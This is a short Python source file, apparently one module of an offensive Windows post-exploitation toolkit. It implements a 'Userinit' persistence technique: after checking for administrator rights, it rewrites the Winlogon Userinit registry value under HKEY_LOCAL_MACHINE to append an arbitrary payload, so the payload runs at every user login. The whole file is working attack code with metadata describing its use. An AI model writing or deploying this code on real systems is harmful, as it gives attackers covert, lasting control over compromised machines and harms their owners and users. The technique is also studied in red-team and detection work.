import os
import _winreg
from core.prints import *
from core.utils import *

userinit_info = {
        "Description": "Gain persistence using Userinit registry key",
		"Id" : "19",
		"Type" : "Persistence",
		"Fixed In" : "99999",
		"Works From" : "7600",
		"Admin" : True,
		"Function Name" : "userinit",
		"Function Payload" : True,	
    }

def userinit(payload):
	if (information().admin() == True):
		try:
			key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,"Software\Microsoft\Windows NT\CurrentVersion\Winlogon",0,_winreg.KEY_ALL_ACCESS)
			_winreg.SetValueEx(key,"Userinit",0,_winreg.REG_SZ,os.path.join(information().system_directory(),"userinit.exe," + os.path.join(payload)))
			_winreg.CloseKey(key)
		except Exception as error:
			print_error("Unable to create registry keys, exception was raised: {}".format(error))
			print_error("Unable to install persistence")
			return False
		else:
			print_success("Successfully created Userinit key containing payload ({})".format(os.path.join(payload)))
			print_success("Successfully installed persistence, payload will run at login")
	else:
		print_error("Cannot proceed, we are not elevated")
		return False